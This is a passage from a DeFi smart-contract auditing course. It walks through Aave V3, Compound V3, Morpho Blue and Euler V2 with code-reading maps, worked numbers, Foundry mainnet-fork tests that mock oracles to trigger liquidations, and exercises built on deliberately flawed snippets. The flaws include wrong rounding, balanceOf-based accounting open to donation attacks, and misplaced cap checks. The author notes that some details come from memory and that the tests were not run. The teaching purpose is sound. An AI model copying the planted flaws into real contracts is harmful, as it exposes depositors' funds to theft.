  1. Why is the liquidation threshold higher than the maximum borrowing ratio?
  2. What happens to depositors if a liquidation cannot be executed?

Lab 2. Aave V3: from reading to exploiting

In plain wordsAave lets people deposit to earn interest and borrow against collateral. Interest is tracked by one growing number, so no user record is updated. If collateral loses value, anyone can repay part of the debt and take collateral at a discount.

Key terms: index, health factor, LTV, liquidation. See the glossary at the end.

Goal: by the end you can trace supply → borrow → liquidate through the real code, reproduce each step on a mainnet fork, and spot the bugs that forks of Aave tend to introduce. Aave V3 is a pool: one Pool proxy holds the logic, one aToken per asset holds deposits, one debt token per asset tracks borrows.

Step 1. Get the code

Do this 
git clone https://github.com/aave/aave-v3-core && cd aave-v3-core
ls contracts/protocol/pool contracts/protocol/libraries/logic contracts/protocol/tokenization
I wrote the file map below from memory of this repo; open each file and confirm names and line numbers against the version you cloned.

Step 2. Reading map

Read thisLook for
pool/Pool.solThin entry points. Each function calls a library with _reserves, _usersConfig. Note modifiers (onlyPoolConfigurator) and what is NOT guarded.
logic/SupplyLogic.solexecuteSupply: updateState → validate → updateInterestRates → transfer → aToken.mint.
logic/BorrowLogic.sol + ValidationLogic.validateBorrowEvery condition that can revert a borrow: caps, eMode, isolation, siloed, HF, LTV.
logic/ReserveLogic.solupdateState, _updateIndexes, cumulateToLiquidityIndex, treasury accrual.
logic/GenericLogic.solcalculateUserAccountData: loops all of the user's reserves and builds HF.
logic/LiquidationLogic.solClose factor, _calculateAvailableCollateralToLiquidate, bonus, protocol fee.
tokenization/AToken.sol, VariableDebtToken.solbalanceOf = scaledBalance · normalizedIncome (aToken) or normalizedDebt (debt). Mint/burn zero-amount reverts.
libraries/math/WadRayMath.sol, PercentageMath.solRounding: rayMul and rayDiv round half up. Percentages are basis points (10000 = 100%).

Step 3. Follow the numbers

Supply. Liquidity index = 1.05. You supply 1,000 USDC. Scaled amount = 1000 / 1.05 = 952.381. Later the index is 1.10, so your aToken balance is 952.381 · 1.10 = 1,047.62. Nothing was written to your account; only the global index moved. If a supply is so small that scaled amount rounds to 0, the mint reverts.

Rate model. Parameters: base 0%, slope1 4%, slope2 60%, optimal utilization 90%.

UBorrow rateCalculation
45%2%4% · 0.45/0.90
90%4%kink
95%34%4% + 60% · (0.95−0.90)/(1−0.90)

At U = 95% with a 10% reserve factor, suppliers earn 34% · 0.95 · 0.9 = 29.07%. The steep slope2 pushes borrowers to repay and suppliers to deposit.

Borrow vs. liquidation. 10 ETH at $2,000, LTV 80%, LT 82.5%. Max borrow = 20,000 · 0.80 = $16,000 (LTV is used at borrow time). At that debt, HF = 20,000 · 0.825 / 16,000 = 1.031 (LT is used for liquidation). The 2.5-point gap is the user's safety buffer.

Liquidation. ETH falls to $1,550: HF = 15,500 · 0.825 / 16,000 = 0.799. HF is below 0.95, so the liquidator may repay up to 100% of the debt in recent V3 versions (50% in older ones; check CLOSE_FACTOR_HF_THRESHOLD in the version you read). With bonus 105%, repaying $8,000 seizes 8,000 · 1.05 / 1,550 = 5.419 ETH.

Step 4. Reproduce it on a mainnet fork

Get a free RPC URL (Alchemy or Infura), then:

export ETH_RPC_URL=https://...            # your mainnet RPC
forge test --match-contract AaveLab --fork-url $ETH_RPC_URL -vvv
// test/AaveLab.t.sol  (addresses: verify on the Aave address book before use)
import "forge-std/Test.sol";
interface IPool {
    function supply(address a, uint v, address on, uint16 ref) external;
    function borrow(address a, uint v, uint mode, uint16 ref, address on) external;
    function liquidationCall(address col, address debt, address user, uint cover, bool recvA) external;
    function getUserAccountData(address u) external view returns (
        uint totalCol, uint totalDebt, uint avail, uint lt, uint ltv, uint hf);
    function ADDRESSES_PROVIDER() external view returns (address);
}
interface IProvider { function getPriceOracle() external view returns (address); }
interface IERC20 { function approve(address, uint) external returns (bool); }

contract AaveLab is Test {
    IPool pool = IPool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address alice = address(0xA11CE); address liq = address(0xBEEF);

    function test_borrowThenLiquidate() public {
        deal(WETH, alice, 10 ether);
        vm.startPrank(alice);
        IERC20(WETH).approve(address(pool), 10 ether);
        pool.supply(WETH, 10 ether, alice, 0);
        (, , uint avail,,,) = pool.getUserAccountData(alice);   // base currency, 8 decimals
        uint amt = (avail * 95 / 100) / 100;                    // USD*1e8 → USDC*1e6, 95% of max
        pool.borrow(USDC, amt, 2, 0, alice);                    // 2 = variable rate
        vm.stopPrank();
        (,,,,, uint hf0) = pool.getUserAccountData(alice);
        emit log_named_decimal_uint("HF before", hf0, 18);

        // crash ETH price by mocking the Aave oracle
        address oracle = IProvider(pool.ADDRESSES_PROVIDER()).getPriceOracle();
        vm.mockCall(oracle, abi.encodeWithSignature("getAssetPrice(address)", WETH), abi.encode(uint(1000e8)));
        (,,,,, uint hf1) = pool.getUserAccountData(alice);
        emit log_named_decimal_uint("HF after crash", hf1, 18);
        assertLt(hf1, 1e18);

        deal(USDC, liq, amt); vm.startPrank(liq);
        IERC20(USDC).approve(address(pool), amt);
        pool.liquidationCall(WETH, USDC, alice, amt / 2, false);  // repay half
        vm.stopPrank();
    }
}

I haven't run this test. If it reverts, read the revert string, then find that check in ValidationLogic. Debugging a revert by finding its source line is the core audit skill.

Experiments (1) vm.warp(block.timestamp + 365 days) before reading HF: debt grows through the borrow index. (2) Borrow 100% of avail: what reverts? (3) Supply more than the reserve's supply cap: find the require.

Step 5. Find the bug (Aave-style forks)

// A. rate strategy
else r = base + slope1 + slope2 * (U - Uopt) / Uopt;

// B. liquidation amount
uint collateralAmount = debtToCover * debtPrice / colPrice;
collateralAmount = collateralAmount * bonus / 10000;      // bonus stored as 10500

// C. validateBorrow
require(totalCollateral * avgLT / 10000 >= totalDebt + newDebt);
Answers
  1. A. Denominator should be (1 - Uopt) (the headroom above the kink), not Uopt. With Uopt = 90%, the slope2 portion is scaled 9× too small, so rates stay low at 100% utilization and suppliers cannot withdraw.
  2. B. Decimals: debtPrice/colPrice loses the token-decimal scaling (6 vs 18). The real code multiplies by 10**collateralDecimals and divides by 10**debtDecimals. Missing it mis-sizes seizure by 1012.
  3. C. Uses LT where LTV belongs. A new borrow lands at HF ≈ 1, so any tiny price move makes it liquidatable, and attackers can grief users.

Step 6. Real-world study

  • Nov 2022, CRV market on Aave V2: a large short exposed thin liquidity and left roughly seven figures of bad debt. Lesson: oracle and liquidity risk for low-liquidity collateral. Read Aave governance forum posts on it, then see how supply/borrow caps and isolation mode respond.
  • Read the Aave V3 audit reports (OpenZeppelin, Trail of Bits, ABDK, SigmaPrime) and list every finding by category: access control, rounding, config, oracle. This teaches you what real critical-vs-low looks like.

Step 7. Aave audit checklist

  • State accrual happens first in every path that reads a balance or HF.
  • HF is checked after the state change (borrow, withdraw, collateral toggle, eMode switch).
  • Each flow enforces caps, freeze, pause and isolation/siloed rules. Compare repay, repayWithATokens and liquidationCall.
  • Rounding: mint scaled amounts round half up in WadRay; check every custom math in a fork instead.
  • Decimals normalised wherever prices multiply amounts.
  • Listing: no fee-on-transfer, rebasing or hook tokens without an adapter.
Lab 2 deliverableWrite a one-page "Aave V3 supply → borrow → liquidate" trace with function names and line numbers from your clone, and one finding-format note on any assumption you think is risky.

Lab 3. Compound V3 (Comet)

In plain wordsCompound V3 is a simplified lender: each market has one borrowable asset, collateral earns nothing, and each user has one signed balance (positive means supplied, negative means borrowed). The protocol takes over a failing account first and sells its collateral afterwards.

Key terms: base asset, signed principal, absorb. See the glossary at the end.

Compound V3 is a deliberate simplification of Aave. Each market (a Comet) has one borrowable base asset (e.g. USDC). Users supply the base asset to earn interest, and post collateral (WETH, WBTC...) that earns nothing and can never be borrowed by others. That removes a whole class of Aave bugs (collateral-asset borrowing, isolation rules) and replaces them with different ones.

Step 1. Aave vs Comet: what changes for an auditor

Aave V3Compound V3
Borrowable assetsEvery listed reserveOnly the base asset
Collateral earns interestYesNo
User balanceaToken + debt token, separateOne signed principal: positive = supplied, negative = borrowed
"Am I safe?"Health factor numberTwo booleans: isBorrowCollateralized and isLiquidatable
LiquidationLiquidator repays debt, takes collateralAnyone calls absorb: protocol takes the collateral and clears the debt. Collateral is sold later via buyCollateral
ConfigStorage, changed by PoolConfiguratorImmutables in the implementation; Configurator deploys a new implementation
Borrowborrow()withdraw(base, amount) beyond your balance

Step 2. Get the code and read it

Do this 
git clone https://github.com/compound-finance/comet && cd comet
ls contracts
Open contracts/Comet.sol (one big file) and, as with Aave, confirm each name below against your checkout.
Find in Comet.solLook for
supplyInternal, withdrawInternalOne code path for deposit and borrow. Follow how principal changes sign and how repayAndSupplyAmount / withdrawAndBorrowAmount split an amount.
accrueInternal, presentValue, principalValueIndex growth and the conversion both ways. Which index is used for positive vs negative principal? Which way does each conversion round?
isBorrowCollateralized, isLiquidatableLoop over the user's collateral assets (bitmask assetsIn), price each with its feed, apply the right factor.
absorbInternalSeize collateral at liquidationFactor, clear debt, credit any surplus to the user, and handle the case where collateral is worth less than debt (reserves take the loss).
buyCollateral, quoteCollateralDiscount maths and the targetReserves gate.
getSupplyRate, getBorrowRatePer-second kinked model, scaled by 1e18.

Step 3. Follow the numbers

Signed principal. Indexes start at 1.00 (scale 1e15 in code). You supply 1,000 USDC: principal = +1,000. When baseSupplyIndex = 1.04 you hold 1,000 · 1.04 = 1,040. A borrower with principal −500 and baseBorrowIndex = 1.06 owes 500 · 1.06 = 530. Same variable, two indices, chosen by sign. Rounding must favour the protocol: supplied value rounds down, owed value rounds up.

Collateral factors. 10 ETH at $2,000 = $20,000. Illustrative borrowCF 0.83, liquidateCF 0.90, liquidationFactor 0.95.

EventCalculationResult
Max borrow20,000 · 0.83$16,600
Borrow $16,000collateralized (16,600 ≥ 16,000)OK
Liquidation triggerdebt > collateral · 0.90ETH below $1,777.78
ETH = $1,70017,000 · 0.90 = 15,300 < 16,000liquidatable
absorbcollateral credited = 17,000 · 0.95 = 16,150debt cleared, $150 surplus credited to user
buyCollateraldiscount = storeFrontPriceFactor (0.5) · (1 − 0.95) = 2.5%buyer pays $0.975 per $1 of ETH

Key difference from Aave: the liquidator never needs to hold the debt asset at absorb time, so absorb can be batched cheaply, and bad debt lands on protocol reserves instead of on one liquidator's transaction.

Step 4. Reproduce on a mainnet fork

// test/CometLab.t.sol  (verify the Comet address on Compound's docs first)
import "forge-std/Test.sol";
interface IComet {
    struct AssetInfo { uint8 offset; address asset; address priceFeed; uint64 scale;
        uint64 borrowCollateralFactor; uint64 liquidateCollateralFactor;
        uint64 liquidationFactor; uint128 supplyCap; }
    function supply(address asset, uint amount) external;
    function withdraw(address asset, uint amount) external;
    function absorb(address absorber, address[] calldata accounts) external;
    function borrowBalanceOf(address a) external view returns (uint);
    function collateralBalanceOf(address a, address asset) external view returns (uint128);
    function isBorrowCollateralized(address a) external view returns (bool);
    function isLiquidatable(address a) external view returns (bool);
    function getAssetInfoByAddress(address asset) external view returns (AssetInfo memory);
}
interface IERC20 { function approve(address, uint) external returns (bool); }

contract CometLab is Test {
    IComet comet = IComet(0xc3d688B66703497DAA19211EEdff47f25384cdc3);   // cUSDCv3, mainnet
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address alice = address(0xA11CE);

    function test_borrowInterestAbsorb() public {
        deal(WETH, alice, 10 ether);
        vm.startPrank(alice);
        IERC20(WETH).approve(address(comet), 10 ether);
        comet.supply(WETH, 10 ether);                   // collateral
        comet.withdraw(USDC, 10_000e6);                 // "withdraw" with no balance = borrow
        vm.stopPrank();
        assertTrue(comet.isBorrowCollateralized(alice));
        uint d0 = comet.borrowBalanceOf(alice);

        skip(365 days);
        assertGt(comet.borrowBalanceOf(alice), d0);     // debt grew via baseBorrowIndex

        // crash the ETH price by mocking its Chainlink feed
        address feed = comet.getAssetInfoByAddress(WETH).priceFeed;
        vm.mockCall(feed, abi.encodeWithSignature("latestRoundData()"),
            abi.encode(uint80(1), int256(800e8), block.timestamp, block.timestamp, uint80(1)));
        assertTrue(comet.isLiquidatable(alice));

        address[] memory accts = new address[](1); accts[0] = alice;
        comet.absorb(address(this), accts);             // anyone can call
        assertEq(comet.collateralBalanceOf(alice, WETH), 0);
        assertEq(comet.borrowBalanceOf(alice), 0);
    }
}

Not run by me. If it fails, trace the revert in Comet.sol. If the price mock has no effect, check the feed's decimals and how getPrice reads it.

Experiments (1) Borrow less than baseBorrowMin and find the revert. (2) Use a smaller price drop so the account is liquidatable and a surplus is left; read balanceOf(alice) after absorb. (3) After absorb, approve USDC and call buyCollateral; compare quoteCollateral to the market price.

Step 5. Find the bug

// A. conversion
function presentValue(int104 p) internal view returns (int256) {
    return p >= 0 ? p * baseSupplyIndex / 1e15 : p * baseSupplyIndex / 1e15;
}
// B. buyCollateral price
uint discount = storeFrontPriceFactor * (1e18 + liquidationFactor) / 1e18;
// C. supply cap
require(totalsCollateral[asset].totalSupplyAsset <= supplyCap);
totalsCollateral[asset].totalSupplyAsset += amount;
Answers
  1. A. Negative principal (debt) must use baseBorrowIndex. With the supply index, debt grows at the (lower) supply rate, so borrowers underpay interest and suppliers are not paid in full.
  2. B. The discount must be built from (1 − liquidationFactor). Adding instead of subtracting gives buyers a premium, collateral never sells, and reserves never recover, so absorbed collateral rots on the balance sheet.
  3. C. The check runs before the increment, so one deposit can push supply above the cap. Check the post-increment value.

Step 6. Study material

  • Read the public Compound V3 audits (OpenZeppelin, ChainSecurity) and sort findings into: accounting, oracle, config, liquidation.
  • Sept 2021, Proposal 62 (Compound V2): an upgrade to the Comptroller's reward distribution over-paid millions of dollars in COMP. Lesson: reward and upgrade logic is as dangerous as core lending; study how governance review missed it.
  • Study how a market's targetReserves and storeFrontPriceFactor decide whether liquidation proceeds ever get sold, and write down the failure mode if reserves are above target.

Step 7. Compound V3 checklist

  • Signed principal: every conversion uses the right index for the sign and rounds toward the protocol.
  • Every path (supply, withdraw, transfer, absorb) calls accrueInternal first and re-checks collateralization at the end.
  • Assets-in bitmask updated on every collateral balance change (a stale bit means a missing or phantom collateral).
  • Price feeds: decimals, staleness, zero and negative answers, all handled for every collateral asset.
  • absorb and buyCollateral: discount sign, reserve accounting when collateral is worth less than debt.
  • Configurator and upgrade path: who can set factors, what happens to existing positions when a factor drops.
Lab 3 deliverableWrite a half-page comparing Aave and Compound V3 for the same event (ETH falls 20%): who calls what, who bears bad debt, and which design you think has the larger oracle-risk surface and why.

Lab 4. Morpho Blue

In plain wordsMorpho Blue is lending cut to the minimum. A market is five fixed parameters that can never be changed, so there is no committee tuning risk. The question becomes whether you trust that market's price source and collateral.

Key terms: isolated market, LLTV, virtual shares. See the glossary at the end.

Morpho Blue is lending reduced to its minimum: one immutable ~600-line contract, no governance over risk parameters, and every market isolated. A market is just five values; anyone can create one. That makes the code small enough to audit fully, and moves the real risk into which market you trust.

Step 1. The market is its parameters

struct MarketParams {
    address loanToken;        // asset lent and borrowed
    address collateralToken;  // asset posted as collateral
    address oracle;           // price() = collateral price in loan token, scaled 1e36
    address irm;              // interest rate model
    uint256 lltv;             // liquidation LTV, WAD (0.86e18 = 86%)
}
bytes32 id = keccak256(abi.encode(marketParams));

State per market: totalSupplyAssets, totalSupplyShares, totalBorrowAssets, totalBorrowShares, lastUpdate, fee. Per position: supplyShares, borrowShares, collateral. There are no aTokens: everything is shares in storage.

Aave V3Morpho Blue
MarketsOne pool, many reserves, shared riskEach (loan, collateral, oracle, irm, lltv) isolated
Risk parametersGovernance can change LTV, capsFixed at market creation; owner can only enable IRMs/LLTVs and set fees
AccountingIndexes, rounding half upShares with virtual offset; directional rounding
Bad debtStays until governance actsSocialized to suppliers inside liquidate
LiquidationClose factor, fixed bonusNo close factor; bonus is a function of LLTV

Step 2. Get the code and read it

Do this 
git clone https://github.com/morpho-org/morpho-blue && cd morpho-blue
wc -l src/Morpho.sol src/libraries/*.sol
Read src/Morpho.sol top to bottom (it is short). Names below are from memory; confirm them in your checkout.
ReadLook for
supply / withdraw / borrow / repayEach takes either assets or shares (exactly one non-zero). Note which conversion rounds which way.
_accrueInterestInterest = totalBorrowAssets · (e^(r·Δt) − 1) via a 3-term Taylor series; part goes to the fee recipient as supply shares.
_isHealthymaxBorrow = collateral · price / 1e36 · lltv compared to borrowed assets (rounded up).
liquidateSeized/repaid conversion, incentive factor, bad-debt branch when collateral reaches 0.
Callbacks (data argument)Non-empty data calls back msg.sender. State must already be updated at that point.
setAuthorization, _isSenderAuthorizedWho can move a user's position (onBehalf).
libraries/SharesMathLib.solVirtual shares (1e6) and virtual assets (1); toSharesDown/Up, toAssetsDown/Up.

Step 3. Follow the numbers

Shares with a virtual offset. shares = assets · (totalShares + 1e6) / (totalAssets + 1).

  • Empty market, supply 1 wei: shares = 1 · 1e6 / 1 = 1,000,000.
  • Market with 1,000 assets and 1,000e6 shares. Supply 500: 500 · (1000e6 + 1e6) / (1000 + 1) = 500e6 shares.
  • After interest (assets 1,100), supply 500 again: 500 · 1001e6 / 1101 = 454.5e6 shares (rounded down; the depositor gets slightly fewer).

Why donation attacks fail here. Morpho tracks totalSupplyAssets in storage, not via token.balanceOf. A direct token transfer to the contract changes nothing in the accounting, so the Bug 3 attack from M1 has no lever. The 1e6 virtual shares additionally cap what rounding can steal.

Health. Loan = USDC (6 dec), collateral = WETH (18 dec), ETH = $2,000. Oracle price = 1e36 · 1e6/1e18 · 2000 = 2000e24. Collateral 10 ETH: value = 10e18 · 2000e24 / 1e36 = 20,000e6. With LLTV 86%, max borrow = $17,200. Borrowed $16,000, healthy.

Liquidation incentive. LIF = min(1.15, 1 / (1 − 0.3 · (1 − LLTV))). For LLTV 86%: 1 / (1 − 0.042) = 1.0438. For LLTV 94.5%: 1.0168. Higher LLTV means less room, so a smaller bonus. ETH at $1,700: max borrow = 17,000 · 0.86 = 14,620 < 16,000, liquidatable. Seizing 5 ETH (worth $8,500) costs the liquidator 8,500 / 1.0438 = $8,143 of USDC.

Bad debt. If a liquidation takes all the collateral and borrow shares remain, the leftover debt is subtracted from totalSupplyAssets immediately: every supplier shares the loss in proportion to shares.

Step 4. Build a market on a fork

Because anyone can create a market, your test can build its own with a mock oracle and mock IRM, giving you full control of price and rate.

// test/MorphoLab.t.sol  (verify the Morpho address in Morpho's docs)
import "forge-std/Test.sol";
struct MarketParams { address loanToken; address collateralToken; address oracle; address irm; uint256 lltv; }
struct Market { uint128 totalSupplyAssets; uint128 totalSupplyShares; uint128 totalBorrowAssets;
                uint128 totalBorrowShares; uint128 lastUpdate; uint128 fee; }
interface IMorpho {
    function owner() external view returns (address);
    function enableIrm(address) external; function enableLltv(uint) external;
    function createMarket(MarketParams memory) external;
    function supply(MarketParams memory, uint assets, uint shares, address on, bytes memory d) external returns (uint, uint);
    function supplyCollateral(MarketParams memory, uint assets, address on, bytes memory d) external;
    function borrow(MarketParams memory, uint assets, uint shares, address on, address to) external returns (uint, uint);
    function liquidate(MarketParams memory, address b, uint seized, uint repaidShares, bytes memory d) external returns (uint, uint);
    function market(bytes32 id) external view returns (Market memory);
    function position(bytes32 id, address u) external view returns (uint supplyShares, uint128 borrowShares, uint128 collateral);
}
interface IERC20 { function approve(address, uint) external returns (bool); }
contract MockOracle { uint public price = 2000e24; function set(uint p) external { price = p; } }
contract MockIrm {   // ~10% per year, WAD per second
    function borrowRate(MarketParams memory, Market memory) external pure returns (uint) { return 3170979198; }
    function borrowRateView(MarketParams memory, Market memory) external pure returns (uint) { return 3170979198; }
}
contract MorphoLab is Test {
    IMorpho m = IMorpho(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    MockOracle oracle; MarketParams p; bytes32 id;
    address bob = address(0xB0B); address alice = address(0xA11CE); address liq = address(0xBEEF);

    function setUp() public {
        oracle = new MockOracle(); MockIrm irm = new MockIrm();
        p = MarketParams(USDC, WETH, address(oracle), address(irm), 0.86e18);
        vm.startPrank(m.owner()); m.enableIrm(address(irm)); vm.stopPrank();
        // lltv 0.86e18 is already enabled on mainnet; if not, call m.enableLltv(0.86e18) as owner
        m.createMarket(p); id = keccak256(abi.encode(p));
        deal(USDC, bob, 100_000e6); vm.startPrank(bob);
        IERC20(USDC).approve(address(m), type(uint).max);
        m.supply(p, 100_000e6, 0, bob, ""); vm.stopPrank();
    }
    function test_borrowAndLiquidate() public {
        deal(WETH, alice, 10 ether); vm.startPrank(alice);
        IERC20(WETH).approve(address(m), 10 ether);
        m.supplyCollateral(p, 10 ether, alice, "");
        m.borrow(p, 16_000e6, 0, alice, alice); vm.stopPrank();

        oracle.set(1700e24);                               // price crash
        deal(USDC, liq, 20_000e6); vm.startPrank(liq);
        IERC20(USDC).approve(address(m), type(uint).max);
        m.liquidate(p, alice, 5 ether, 0, ""); vm.stopPrank();
        (, , uint128 col) = m.position(id, alice);
        assertEq(col, 5 ether);
    }
}

Not run by me. If enableIrm or createMarket reverts, read the revert string and find the require in Morpho.sol.

Experiments (1) Set the oracle to 500e24 and liquidate all 10 ETH. Compare market(id).totalSupplyAssets before and after to see bad debt hit suppliers. (2) Transfer 1,000 USDC directly to Morpho; confirm totalSupplyAssets does not move. (3) skip(365 days) then supply 1 wei: see how many shares it mints.

Step 5. Find the bug

// A. borrow()
shares = assets.toSharesDown(market.totalBorrowAssets, market.totalBorrowShares);
// B. _isHealthy()
uint maxBorrow = collateral.mulDivUp(price, 1e36).wMulDown(lltv);
// C. end of liquidate()
position[id][borrower].collateral -= seizedAssets;     // no bad-debt branch
// D. supply()
require(market.totalSupplyAssets + assets <= IERC20(loanToken).balanceOf(address(this)));
Answers
  1. A. Borrow shares must round up. Rounding down lets a borrower take assets while recording too few shares of debt, and repeated tiny borrows drain value.
  2. B. Collateral value must round down. Rounding up inflates borrowing power in the borrower's favour.
  3. C. When collateral reaches zero with debt outstanding, the leftover borrow shares must be written off against totalSupplyAssets. Without that, suppliers' balances are overstated and the last ones to withdraw cannot get their funds.
  4. D. Reading balanceOf reintroduces the donation attack that Morpho avoids by accounting in storage, and lets an attacker block supplies by donating tokens.

Step 6. Study material

  • Read the Morpho Blue audits (Spearbit, Cantina, Trail of Bits) and the Certora formal-verification report; note which invariants were proved (e.g. totalSupplyShares equals the sum of positions).
  • Read about MetaMorpho vaults: ERC-4626 on top of Morpho with owner, curator, allocator and guardian roles. Find how supply caps and timelocks limit a malicious curator.
  • Lesson to write down: with permissionless markets, a lender's real risk is a bad oracle or collateral token in a market they choose. Morpho does not (and cannot) validate these.

Step 7. Morpho Blue checklist

  • Every conversion between assets and shares rounds in the protocol's favour (see the table above).
  • Exactly one of assets/shares is non-zero on every entry point.
  • Interest is accrued before every read of totals, and callbacks run only after state is final.
  • Oracle scale is correct for the token decimals of the pair (the 1e36 convention).
  • Authorization: onBehalf operations require owner or an authorized operator, signature replay and nonce handling for setAuthorizationWithSig.
  • Bad-debt path leaves the books consistent; flash loans cannot leave balances below accounted totals.
Lab 4 deliverableFor a market you pick on the Morpho app (loan token, collateral, oracle, IRM, LLTV), write a half-page risk memo: who controls the oracle, what is the worst-case loss for lenders, and what you would check before depositing.

Lab 5. Euler V2

In plain wordsEuler V2 lets anyone create vaults and link them as collateral for each other. A connector contract checks solvency once, at the end of a batch of actions, so users can chain many steps in one transaction. Auditing means checking that every action that can hurt an account requests that final check.

Key terms: vault, controller, deferred check. See the glossary at the end.

Euler V2 splits lending into two layers: the Ethereum Vault Connector (EVC), which authenticates accounts and defers solvency checks, and the Euler Vault Kit (EVK), a family of ERC-4626 vaults that can lend out their assets. Vaults are permissionless to create and are linked by who accepts whose shares as collateral. Learn the EVC first: most Euler V2 bugs live at the boundary between the two.

Step 1. The mental model

ConceptMeaning
VaultERC-4626 token for one asset. Deposits are shares. A borrow vault also lends its cash out.
ControllerThe one borrow vault that "controls" an account: it may check its health and liquidate it. Enabled via evc.enableController.
CollateralAny vault whose shares the controller accepts (it sets LTVBorrow and LTVLiquidation per collateral vault). Enabled via evc.enableCollateral.
Unit of accountThe currency (USD, ETH...) in which the controller's oracle prices everything.
Sub-accountsEach address owns 256 sub-accounts (same top 19 bytes) so one wallet can run isolated positions.
Deferred checksInside evc.batch, account and vault status checks run once at the end, so the account may be temporarily insolvent mid-batch.
OperatorsAddresses an account owner authorizes to act on its sub-accounts.

Compared to Lab 4: Morpho isolates risk by making every market immutable. Euler lets vaults connect into a graph, with configurable governors, and relies on the EVC to keep every connected account solvent.

Step 2. Get the code and read it

Do this 
git clone https://github.com/euler-xyz/ethereum-vault-connector
git clone https://github.com/euler-xyz/euler-vault-kit
# read EVC first: src/EthereumVaultConnector.sol
# then EVK: src/EVault/EVault.sol and src/EVault/modules/*
Names below are from memory; confirm them in your checkout.
ReadLook for
EVC: batch, call, controlCollateralHow onBehalfOfAccount is authenticated (owner, operator, or EVC-self), and the transient "execution context" flags.
EVC: checkAccountStatus, requireAccountStatusCheckThe deferred-check set and when it is drained.
EVK modules: Vault (ERC-4626), Borrowing, Liquidation, RiskManager, Governance, TokenThe EVault proxy delegatecalls into these modules; storage lives in the proxy.
Cache.sol / LiquidityUtils.solHow a vault computes account liquidity from all enabled collateral.
Liquidation.sol calculateLiquidationDiscount, repay-to-yield conversion, caps, bad-debt branch.
Cash accountingThe vault tracks cash internally; tokens sent directly are ignored until skim.

Step 3. Follow the numbers

Borrow vs. liquidation limits. 10 ETH collateral = $20,000. Illustrative LTVBorrow 0.80 and LTVLiquidation 0.85. Max borrow = $16,000. Borrow $16,000: healthy.

Liquidation discount (continuous, not fixed). ETH falls to $1,850, collateral = $18,500. Health score = 18,500 · 0.85 / 16,000 = 0.9828. The discount grows with how unhealthy the account is: discount = 1 − 0.9828 = 1.72% (capped by a vault maximum). A liquidator repaying $8,000 receives collateral worth 8,000 / 0.9828 = $8,140 = 4.400 ETH. If ETH falls further so the score is 0.90, the discount is 10%, so liquidators are paid more the longer an account stays underwater. I wrote this formula from memory; confirm it in calculateLiquidation.

Deferred checks in a batch. Leverage in one transaction: [borrow 16,000 USDC, deposit 10 ETH]. Executed alone, the borrow fails (no collateral). Inside evc.batch the account status is checked only at the end, when the deposit exists, so it passes. This is powerful and is exactly why every vault function that can hurt an account must request a check.

Shares and donations. The vault adds virtual deposit (≈1e6) to shares maths and keeps cash in storage, so a direct transfer does not change the share price. Same principle as Morpho, with skim as the explicit way to recognize stray tokens.

Step 4. Experiment on a fork

Euler V2 has many vaults, so find two on app.euler.finance: a borrow vault and a collateral vault it accepts (the borrow vault's LTVBorrow(collateralVault) must be non-zero). Put the addresses in env vars.

export ETH_RPC_URL=https://...
export EVC=0x...  BORROW_VAULT=0x...  COLLATERAL_VAULT=0x...   # verify all three
forge test --match-contract EulerLab --fork-url $ETH_RPC_URL -vvv
// test/EulerLab.t.sol
import "forge-std/Test.sol";
interface IEVC {
    struct BatchItem { address targetContract; address onBehalfOfAccount; uint256 value; bytes data; }
    function enableCollateral(address account, address vault) external;
    function enableController(address account, address vault) external;
    function batch(BatchItem[] calldata items) external payable;
}
interface IVault {
    function asset() external view returns (address);
    function deposit(uint amt, address to) external returns (uint);
    function borrow(uint amt, address to) external returns (uint);
    function debtOf(address a) external view returns (uint);
    function accountLiquidity(address a, bool liquidation) external view returns (uint col, uint liab);
    function LTVBorrow(address collateral) external view returns (uint16);
}
interface IERC20 { function approve(address, uint) external returns (bool); }

contract EulerLab is Test {
    IEVC evc = IEVC(vm.envAddress("EVC"));
    IVault bv = IVault(vm.envAddress("BORROW_VAULT"));
    IVault cv = IVault(vm.envAddress("COLLATERAL_VAULT"));
    address alice = address(0xA11CE);

    function test_deferredCheck() public {
        address colAsset = cv.asset();
        uint dep = 100 * 10 ** 18;                         // adjust to the asset's decimals
        uint brw = 1 * 10 ** 6;                            // small borrow; adjust to the borrow asset
        deal(colAsset, alice, dep);
        vm.startPrank(alice);
        IERC20(colAsset).approve(address(cv), dep);
        evc.enableCollateral(alice, address(cv));
        evc.enableController(alice, address(bv));

        // 1) borrowing first, outside a batch: should revert (no collateral yet)
        vm.expectRevert();
        bv.borrow(brw, alice);

        // 2) the same order inside a batch: checks are deferred to the end
        IEVC.BatchItem[] memory items = new IEVC.BatchItem[](2);
        items[0] = IEVC.BatchItem(address(bv), alice, 0, abi.encodeCall(IVault.borrow, (brw, alice)));
        items[1] = IEVC.BatchItem(address(cv), alice, 0, abi.encodeCall(IVault.deposit, (dep, alice)));
        evc.batch(items);
        vm.stopPrank();

        (uint col, uint liab) = bv.accountLiquidity(alice, false);
        emit log_named_uint("collateral value", col);
        emit log_named_uint("liability value", liab);
        assertGt(bv.debtOf(alice), 0);
    }
}

Not run by me. Typical failures: the collateral vault is not accepted by the borrow vault, the borrow vault lacks cash, or amounts violate a cap or minimum. Read the revert and find the require in the module.

Experiments (1) Borrow too much in the batch and read which check fails. (2) skip(30 days) and compare debtOf. (3) Send some collateral asset directly to cv and confirm share price does not change; find skim and read what it does.

Step 5. Find the bug

// A. cash accounting
function totalAssets() public view returns (uint) { return asset.balanceOf(address(this)) + totalBorrows; }

// B. donate to reserves
function donateToReserves(uint amt) external {
    balanceOf[msg.sender] -= amt; reserveBalance += amt;       // no health check afterwards
}

// C. liquidation maths
uint discount = 1e18 - healthScore;                            // no cap
uint yield = repay * 1e18 / (1e18 - discount);

// D. liquidate()
// violator: any account; collateral: any vault the liquidator names
seize(violator, collateral, yield);
Answers
  1. A. Reading balanceOf lets anyone change the share price by donating tokens: the inflation attack from M1. Fix: track cash in storage and require an explicit skim.
